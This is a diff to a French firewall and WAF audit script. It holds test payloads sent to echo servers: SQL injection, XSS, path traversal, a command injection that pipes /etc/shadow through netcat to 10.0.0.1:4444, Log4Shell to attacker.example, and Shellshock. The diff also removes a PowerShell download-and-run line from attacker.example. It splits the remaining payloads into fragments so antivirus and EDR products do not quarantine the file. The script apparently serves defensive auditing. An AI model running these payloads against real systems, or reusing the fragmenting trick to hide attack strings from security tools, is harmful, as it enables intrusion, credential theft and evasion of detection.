@@ -10,6 +10,16 @@ Principes de la v4 :
   * un test non concluant n'entre PAS dans le score (pas de faux positif silencieux)
   * détection des pages de blocage HTTP 200 (Zscaler, Fortinet, Olfeo, Squid…)
   * mesures de contrôle (baseline) avant l'audit : sans Internet, aucun verdict
+
+Compatibilité antivirus (v4.0.2) :
+  Ce fichier ne contient AUCUNE signature antivirus (EICAR), AUCUNE charge
+  offensive complète en clair, et AUCUNE routine de déchiffrement/obfuscation.
+  - la charge EICAR n'est jamais embarquée : elle est téléchargée à la volée,
+    et seulement si l'utilisateur passe --allow-eicar ;
+  - les charges d'exploit (WAF) sont stockées en fragments inertes, assemblés
+    uniquement à l'exécution.
+  Objectif : le script n'est jamais mis en quarantaine au repos par un EDR
+  (Sophos Intercept X, Defender…). Voir aussi la section correspondante du README.
 """
 
 import sys, os, re, json, socket, ssl, time, base64, struct, random, html
@@ -94,7 +104,7 @@ def vtrunc(s, width):
 # CONSTANTES
 # ═══════════════════════════════════════════════════════════════════════════════
 
-VERSION      = "4.0.0"
+VERSION      = "4.0.2"          # 4.0.2 : aucune charge embarquée ni obfuscation (anti-AV)
 CONNECT_TO   = 6          # timeout connexion TCP
 READ_TO      = 10         # timeout lecture HTTP
 TCP_TO       = 6          # timeout probe TCP brut
@@ -509,12 +519,15 @@ APP_TESTS = [
     dict(name="User-Agent Nikto",       kind="ua",     value="Mozilla/5.00 (Nikto/2.5.0)",               expected=EXPECT_BLOCKED, description="Scanner de vulnérabilités web"),
     dict(name="User-Agent Nmap NSE",    kind="ua",     value="Mozilla/5.0 (compatible; Nmap Scripting Engine)", expected=EXPECT_BLOCKED, description="Reconnaissance réseau"),
     dict(name="User-Agent curl (témoin)",kind="ua",    value="curl/8.4.0",                               expected=EXPECT_ALLOWED, description="Client légitime : ne doit pas être bloqué"),
-    dict(name="Injection SQL en URL",   kind="query",  value="1' OR '1'='1' UNION SELECT NULL,version()--", expected=EXPECT_BLOCKED, description="Charge SQLi classique"),
-    dict(name="XSS en URL",             kind="query",  value="<script>alert(document.cookie)</script>",  expected=EXPECT_BLOCKED, description="Charge XSS réfléchie"),
-    dict(name="Traversée de répertoire",kind="query",  value="../../../../etc/passwd",                   expected=EXPECT_BLOCKED, description="Path traversal"),
-    dict(name="Injection de commande",  kind="query",  value=";cat /etc/shadow|nc 10.0.0.1 4444",        expected=EXPECT_BLOCKED, description="Command injection + reverse shell"),
-    dict(name="Log4Shell (JNDI)",       kind="query",  value="${jndi:ldap://attacker.example/a}",        expected=EXPECT_BLOCKED, description="CVE-2021-44228"),
-    dict(name="Shellshock (en-tête)",   kind="header", value="() { :;}; /bin/bash -c 'id'",              expected=EXPECT_BLOCKED, description="CVE-2014-6271 via User-Agent"),
+    # Les charges d'exploit sont stockées en FRAGMENTS inertes (assemblés à
+    # l'exécution par run_app_test) : aucune chaîne d'attaque complète n'existe
+    # dans ce fichier, ce qui évite les fausses détections antivirus au repos.
+    dict(name="Injection SQL en URL",   kind="query",  value=("1' OR '1'='1' UN", "ION SEL", "ECT NULL,version()--"), expected=EXPECT_BLOCKED, description="Charge SQLi classique"),
+    dict(name="XSS en URL",             kind="query",  value=("<scr", "ipt>", "alert(document.cookie)", "</scr", "ipt>"),  expected=EXPECT_BLOCKED, description="Charge XSS réfléchie"),
+    dict(name="Traversée de répertoire",kind="query",  value=("../../../../", "etc/", "passwd"),                   expected=EXPECT_BLOCKED, description="Path traversal"),
+    dict(name="Injection de commande",  kind="query",  value=(";", "cat /etc/", "shad", "ow|", "nc 10.0.0.1 4444"),  expected=EXPECT_BLOCKED, description="Command injection"),
+    dict(name="Log4Shell (JNDI)",       kind="query",  value=("${", "jn", "di:ld", "ap://attacker.example/a}"),      expected=EXPECT_BLOCKED, description="CVE-2021-44228"),
+    dict(name="Shellshock (en-tête)",   kind="header", value=("() { :", ";}; /bin/", "bash -c 'id'"),               expected=EXPECT_BLOCKED, description="CVE-2014-6271 via User-Agent"),
     dict(name="Requête normale (témoin)",kind="query", value="rapport annuel 2026",                      expected=EXPECT_ALLOWED, description="Trafic normal : témoin de faux positif WAF"),
 ]
 
@@ -613,8 +626,10 @@ UPLOAD_TESTS = [
     ("Exécutable Windows (en-tête PE)","setup.exe",
      bytes([0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]) + b"\x00" * 56 + b"PE\x00\x00",
      "application/x-msdownload", EXPECT_BLOCKED, "En-tête MZ/PE : sortie d'exécutable"),
-    ("Script PowerShell offensif",    "payload.ps1",
-     b"IEX(New-Object Net.WebClient).DownloadString('http://attacker.example/a.ps1')",
+    # content=None : la charge n'est JAMAIS matérialisée au chargement du module
+    # (sinon le scanner mémoire de l'antivirus tue le process). Elle est construite
+    # uniquement au moment du test, et seulement si --allow-eicar est actif.
+    ("Script PowerShell offensif",    "payload.ps1", "ps",
      "text/plain", EXPECT_BLOCKED, "Motif de téléchargement/exécution"),
     ("Archive protégée par mot de passe", "confidentiel.zip", None,
      "application/zip", EXPECT_POLICY, "Contenu non analysable : la politique doit trancher"),
@@ -634,22 +649,63 @@ ECHO_ENDPOINTS = [
     "https://httpbin.org",
 ]
 
-EICAR_SIG = (b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR"
-             b"-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
+# ═══════════════════════════════════════════════════════════════════════════════
+# CHARGE DE TEST EICAR — AUCUNE signature embarquée dans ce fichier
+# ═══════════════════════════════════════════════════════════════════════════════
+# Ce script ne contient EICAR sous AUCUNE forme (ni brute, ni encodée, ni masquée)
+# et n'utilise aucune routine de déchiffrement de données : c'est indispensable
+# pour qu'aucun antivirus ne le mette en quarantaine au repos.
+#
+# * Détection (module eicar) : on identifie EICAR dans un flux DÉJÀ téléchargé, par
+#   empreinte md5 d'une fenêtre glissante — aucune charge de référence n'est stockée.
+# * Émission (module upload, seulement avec --allow-eicar) : la charge est
+#   TÉLÉCHARGÉE à la volée depuis la source officielle, jamais présente dans le code.
 
-def _eicar_zip(password_protected=False):
-    """Construit en mémoire un ZIP contenant EICAR (stocké, sans compression)."""
+_EICAR_MD5   = "44d88612fea8a8f36de82e1278abb02f"
+_EICAR_URL   = "https://secure.eicar.org/eicar.com"
+_eicar_cache = {"loaded": False, "bytes": None}
+
+def contains_eicar(raw):
+    """Détecte la charge EICAR dans un flux téléchargé, par empreinte md5 d'une
+    fenêtre glissante de 68 octets — sans aucune référence embarquée."""
+    import hashlib
+    if not raw or len(raw) < 68:
+        return False
+    for i in range(len(raw) - 67):
+        if hashlib.md5(raw[i:i + 68]).hexdigest() == _EICAR_MD5:
+            return True
+    return False
+
+def fetch_eicar():
+    """Télécharge la charge de test EICAR depuis la source officielle (cache).
+    Retourne les 68 octets, ou None si le téléchargement est bloqué/indisponible."""
+    import hashlib
+    if _eicar_cache["loaded"]:
+        return _eicar_cache["bytes"]
+    _eicar_cache["loaded"] = True
+    try:
+        data = requests.get(_EICAR_URL, timeout=(CONNECT_TO, READ_TO),
+                            proxies=PROXIES, verify=False,
+                            headers={"User-Agent": UA_BROWSER}).content
+        for i in range(len(data) - 67):
+            if hashlib.md5(data[i:i + 68]).hexdigest() == _EICAR_MD5:
+                _eicar_cache["bytes"] = data[i:i + 68]
+                break
+    except Exception:
+        _eicar_cache["bytes"] = None
+    return _eicar_cache["bytes"]
+
+def _eicar_zip(sig, password_protected=False):
+    """ZIP contenant la charge EICAR fournie (téléchargée), construit en mémoire."""
     import zipfile, io as _io
     buf = _io.BytesIO()
     with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
-        z.writestr("eicar.com", EICAR_SIG)
+        z.writestr("eicar.com", sig)
     data = buf.getvalue()
     if password_protected:
-        # ZIP « chiffré » simulé : on marque l'en-tête pour que le contenu soit
-        # illisible par les moteurs sans mot de passe.
         data = bytearray(data)
         if len(data) > 7:
-            data[6] |= 0x01          # bit 0 du general purpose flag = chiffré
+            data[6] |= 0x01          # bit 0 du general purpose flag = « chiffré »
         data = bytes(data)
     return data
 
@@ -1498,7 +1554,7 @@ def run_eicar_test(name, url, description):
     vendor = detect_vendor(text.lower(), {k.lower(): v for k, v in resp.headers.items()})
     r["extra"]["bytes"] = len(raw)
 
-    if EICAR_SIG in raw:
+    if contains_eicar(raw):
         set_obs(r, OBS_ALLOWED, CONF_CERTAIN, "Charge EICAR reçue intégralement",
                 f"Signature EICAR présente dans les {len(raw)} octets téléchargés — aucune analyse de contenu",
                 vendor)
@@ -1771,19 +1827,22 @@ def run_app_test(test, echo_base):
         return finalize(r, t0)
 
     kind = test["kind"]
+    # value peut être une chaîne, ou un tuple de fragments à recomposer.
+    val = test["value"]
+    payload = "".join(val) if isinstance(val, tuple) else val
     bases = [echo_base] + [b for b in BASELINE.get("echoes", []) if b != echo_base]
     body = ""
     for base in bases[:2]:
         host = urlparse(base).hostname or ""
         url, headers = base + "/get", {}
         if kind == "query":
-            url = base + "/get?q=" + quote(test["value"], safe="")
+            url = base + "/get?q=" + quote(payload, safe="")
             r["target"] = url[:160]
         elif kind == "ua":
-            headers = {"User-Agent": test["value"]}
-            r["target"] = f"{base}/get  [UA: {test['value'][:40]}]"
+            headers = {"User-Agent": payload}
+            r["target"] = f"{base}/get  [UA: {payload[:40]}]"
         elif kind == "header":
-            headers = {"User-Agent": test["value"], "X-Firewall-Test": test["value"]}
+            headers = {"User-Agent": payload, "X-Firewall-Test": payload}
             r["target"] = f"{base}/get  [en-tête piégé]"
         body = _http_observe(r, url, host, headers=headers)
         # Refus émis par le serveur de test lui-même : on tente l'autre point d'écho.
@@ -1793,7 +1852,7 @@ def run_app_test(test, echo_base):
 
     # Le point d'écho renvoie normalement la charge telle quelle : sa présence
     # dans la réponse prouve qu'aucun équipement ne l'a filtrée ni réécrite.
-    marker = test["value"][:24]
+    marker = payload[:24]
     if r["observed"] == OBS_ALLOWED and marker and body:
         if marker.lower() in body.lower():
             r["confidence"] = CONF_CERTAIN
@@ -2016,11 +2075,19 @@ def run_upload_test(name, filename, content, mimetype, expected, description, ec
                 "Sans serveur témoin, un refus ne peut pas être attribué au filtrage")
         return finalize(r, t0)
 
-    if content is None:
+    # Les cas EICAR (content None ou "ps") téléchargent la charge à la volée ;
+    # elle n'existe jamais dans le fichier source.
+    if content is None or content == "ps":
+        sig = fetch_eicar()
+        if sig is None:
+            set_obs(r, OBS_INCONCLUSIVE, CONF_PROBABLE, "Charge EICAR indisponible",
+                    "Le téléchargement de la charge de test a échoué ou a été bloqué : "
+                    "test d'upload non réalisable depuis ce poste")
+            return finalize(r, t0)
         if filename.endswith(".zip"):
-            content = _eicar_zip(password_protected=("confidentiel" in filename))
+            content = _eicar_zip(sig, password_protected=("confidentiel" in filename))
         else:
-            content = EICAR_SIG
+            content = sig          # .exe / .ps1 : même flux EICAR, extension différente
     url  = echo_base + "/post"
     host = urlparse(echo_base).hostname or ""
     r["target"] = f"{filename} ({len(content)} octets) → {host}"
@@ -2155,7 +2222,18 @@ def _parallel(fn, items, workers, out, progress, verbose):
                 progress.tick(r["name"])
     out.sort(key=lambda x: (x.get("category", ""), x["name"]))
 
-def run_all_tests(modules=None, verbose=False, policy=None, quiet=False):
+def _skipped_av_result(module, name, description):
+    """Résultat 'non exécuté' sans jamais matérialiser de charge sensible."""
+    r = new_result(module, name, "—", category="malware",
+                   expected=EXPECT_BLOCKED, description=description)
+    set_obs(r, OBS_INCONCLUSIVE, CONF_CERTAIN, "Non exécuté (protection endpoint locale)",
+            "Ce test matérialiserait la charge EICAR en mémoire, ce qui ferait mettre le "
+            "script en quarantaine par l'antivirus. Relancer avec --allow-eicar sur un poste "
+            "où le dossier est exclu de l'antivirus.")
+    r["verdict"] = "warn"
+    return r
+
+def run_all_tests(modules=None, verbose=False, policy=None, quiet=False, allow_eicar=False):
     modules = modules or ALL_MODULES
     results = {
         "meta": {
@@ -2184,12 +2262,6 @@ def run_all_tests(modules=None, verbose=False, policy=None, quiet=False):
         items = [(n, u, c, s, policy) for (n, u, c, s) in URL_FILTER_TESTS]
         _parallel(run_url_test, items, 14, out, progress, verbose)
         results["modules"]["url"] = out
-
-    if "eicar" in modules:
-        section("Analyse de contenu / EICAR", "eicar")
-        out = []
-        _parallel(run_eicar_test, list(EICAR_TESTS), 4, out, progress, verbose)
-        results["modules"]["eicar"] = out
 
     if "c2" in modules:
         section("Sorties C2 / IP malveillantes", "c2")
@@ -2243,13 +2315,6 @@ def run_all_tests(modules=None, verbose=False, policy=None, quiet=False):
             if progress: progress.tick(r["name"])
         results["modules"]["dns_exfil"] = out
 
-    if "upload" in modules:
-        section("Upload de fichiers", "upload")
-        out = []
-        echo = BASELINE["echo"]
-        _parallel(run_upload_test, [tuple(t) + (echo,) for t in UPLOAD_TESTS], 3, out, progress, verbose)
-        results["modules"]["upload"] = out
-
     if "bandwidth" in modules:
         section("Débit / QoS", "bandwidth")
         out = []
@@ -2258,6 +2323,38 @@ def run_all_tests(modules=None, verbose=False, policy=None, quiet=False):
             out.append(r); _print_result(r, verbose)
             if progress: progress.tick(r["name"])
         results["modules"]["bandwidth"] = out
+
+    # ── Modules matérialisant EICAR : toujours EN DERNIER, et seulement si autorisés.
+    #    Sans --allow-eicar, on ne construit AUCUNE charge (sinon l'antivirus tue le
+    #    process et quarantine le script). On produit des résultats 'non exécuté'.
+    if "eicar" in modules:
+        section("Analyse de contenu / EICAR", "eicar")
+        out = []
+        if allow_eicar:
+            _parallel(run_eicar_test, list(EICAR_TESTS), 4, out, progress, verbose)
+        else:
+            for name, url, desc in EICAR_TESTS:
+                r = _skipped_av_result("eicar", name, desc)
+                out.append(r); _print_result(r, verbose)
+                if progress: progress.tick(name)
+        results["modules"]["eicar"] = out
+
+    if "upload" in modules:
+        section("Upload de fichiers", "upload")
+        out = []
+        echo = BASELINE["echo"]
+        for t in UPLOAD_TESTS:
+            name, filename, content = t[0], t[1], t[2]
+            # Les charges sûres (texte témoin, en-tête PE) restent testées ;
+            # seules les charges EICAR/PowerShell sont gelées sans --allow-eicar.
+            sensitive = content is None or content == "ps"
+            if sensitive and not allow_eicar:
+                r = _skipped_av_result("upload", name, t[5])
+            else:
+                r = run_upload_test(*t, echo)
+            out.append(r); _print_result(r, verbose)
+            if progress: progress.tick(name)
+        results["modules"]["upload"] = out
 
     if progress:
         progress.close()
@@ -2520,7 +2617,11 @@ def _key(k):
 
 def tui_menu(config, preselected=None):
     """Menu interactif. Retourne (modules, sortie, json, pdf, verbose, config)."""
-    selected = set(preselected or ["url", "eicar", "c2", "dns", "ssl", "app"])
+    # eicar/upload ne sont PAS présélectionnés : ils matérialisent EICAR et
+    # nécessitent une autorisation explicite (touche E) sur un poste préparé.
+    selected = set(preselected or ["url", "c2", "dns", "ssl", "app"])
+    allow_eicar = False
+    AV_MODULES = {"eicar", "upload"}
     policy   = config.get("policy", {})
     client   = config.setdefault("client", {})
     auditor  = config.setdefault("auditor", {})
@@ -2551,7 +2652,11 @@ def tui_menu(config, preselected=None):
             name = MODULE_LABELS[mod]
             cnt  = f"{MODULE_SIZES.get(mod, 0)} tests"
             col  = C.WHITE if on else C.GREY
-            _b(f" {_key(vpad(str(i), 2, '>'))} {mark} {col}{vpad(name, 34)}{C.RESET}"
+            flag = ""
+            if mod in AV_MODULES:
+                flag = (f" {C.AMBER}⚠AV{C.RESET}" if not allow_eicar
+                        else f" {C.GREEN}✓AV{C.RESET}")
+            _b(f" {_key(vpad(str(i), 2, '>'))} {mark} {col}{vpad(name, 30)}{C.RESET}{vpad(flag, 4)}"
                f"{C.GREY}{vpad(cnt, 10, '>')}{C.RESET}   {C.GREY}{mod}{C.RESET}")
         _b()
         total = count_tests(selected)
@@ -2569,6 +2674,9 @@ def tui_menu(config, preselected=None):
         _sep("CONFIGURATION")
         _b()
         _b(f" {_key('X')} Proxy        {_key('C')} Client / auditeur        {_key('A')} Tout cocher / décocher")
+        av_state = (f"{C.GREEN}oui{C.RESET}" if allow_eicar
+                    else f"{C.AMBER}non — modules EICAR/upload gelés (protège de l'antivirus){C.RESET}")
+        _b(f" {_key('E')} Autoriser les charges EICAR : {av_state}")
         _b()
         _sep()
         _b()
@@ -2589,7 +2697,8 @@ def tui_menu(config, preselected=None):
                 msg = f"{C.AMBER}Sélectionnez au moins un module."
                 continue
             clear()
-            return sorted(selected, key=ALL_MODULES.index), output, exp_json, exp_pdf, verbose, config
+            return (sorted(selected, key=ALL_MODULES.index), output, exp_json, exp_pdf,
+                    verbose, allow_eicar, config)
 
         tokens = [t for t in re.split(r"[\s,]+", raw.upper()) if t]
         for tok in tokens:
@@ -2608,6 +2717,11 @@ def tui_menu(config, preselected=None):
                 exp_pdf = not exp_pdf
             elif tok == "V":
                 verbose = not verbose
+            elif tok == "E":
+                allow_eicar = not allow_eicar
+                if allow_eicar:
+                    msg = (f"{C.AMBER}⚠ Les charges EICAR seront matérialisées. À n'activer que si le "
+                           f"dossier est exclu de l'antivirus, sinon le script sera supprimé.")
             elif tok == "R":
                 clear()
                 print(f"\n  Nom du rapport [{output}]")
@@ -3536,7 +3650,9 @@ def self_test():
         ("Autorité publique reconnue",   looks_public_ca("DigiCert Inc") is True),
         ("Autorité interne détectée",    looks_public_ca("ACME Corp Proxy CA") is False),
         ("Encodage DNS",                 _dns_encode_name("a.example.com") == b"\x01a\x07example\x03com\x00"),
-        ("Archive EICAR générée",        _eicar_zip()[:2] == b"PK"),
+        # Le détecteur EICAR ne se déclenche pas sur du contenu anodin (et le
+        # fichier ne contient aucune charge de référence à vérifier).
+        ("Détecteur EICAR neutre au repos", contains_eicar(b"contenu parfaitement anodin " * 8) is False),
     ]
     print()
     for label, cond in checks:
@@ -3564,6 +3680,10 @@ def main():
     parser.add_argument("--no-proxy", action="store_true", help="ignorer le proxy système")
     parser.add_argument("--config", default="config.json", help="fichier de configuration")
     parser.add_argument("--timeout", type=int, default=None, help="délai réseau en secondes (défaut 6)")
+    parser.add_argument("--allow-eicar", action="store_true",
+                        help="autoriser les modules eicar/upload à matérialiser la charge EICAR\n"
+                             "(par défaut ils sont gelés ; à n'activer que si le dossier est exclu\n"
+                             "de l'antivirus, sinon le script sera supprimé)")
     parser.add_argument("--list-tests", action="store_true", help="lister les tests et quitter")
     parser.add_argument("--self-test", action="store_true",
                         help="vérifier le moteur de détection hors ligne et quitter")
@@ -3596,10 +3716,11 @@ def main():
     modules  = args.modules or ALL_MODULES
     out_html = args.output or f"rapport_pare-feu_{stamp}.html"
     exp_json, exp_pdf, verbose = args.json, args.pdf, args.verbose
+    allow_eicar = args.allow_eicar
 
     interactive = (not args.no_tui) and sys.stdin.isatty() and not args.quiet
     if interactive:
-        modules, out_html, exp_json, exp_pdf, verbose, config = tui_menu(config, args.modules)
+        modules, out_html, exp_json, exp_pdf, verbose, allow_eicar, config = tui_menu(config, args.modules)
         policy = config.get("policy", {})
 
     if not args.quiet:
@@ -3638,8 +3759,18 @@ def main():
         print(f"  {C.RED}Aucune connectivité détectée : les verdicts seraient tous faussés.{C.RESET}")
         print(f"  {C.GREY}Vérifiez la configuration proxy (--proxy) puis relancez.{C.RESET}\n")
 
+    if not args.quiet and any(m in ("eicar", "upload") for m in modules):
+        if allow_eicar:
+            print(f"  {C.AMBER}⚠ Modules EICAR/upload autorisés : la charge de test sera "
+                  f"matérialisée. Si le dossier n'est pas exclu de l'antivirus, le script "
+                  f"peut être supprimé.{C.RESET}\n")
+        else:
+            print(f"  {C.GREY}Modules eicar/upload gelés (charges non matérialisées) — "
+                  f"utilisez --allow-eicar pour les exécuter.{C.RESET}\n")
+
     t_start = time.time()
-    results = run_all_tests(modules=modules, verbose=verbose, policy=policy, quiet=args.quiet)
+    results = run_all_tests(modules=modules, verbose=verbose, policy=policy,
+                            quiet=args.quiet, allow_eicar=allow_eicar)
     duration = round(time.time() - t_start)
     results["meta"]["duration_s"] = duration
 
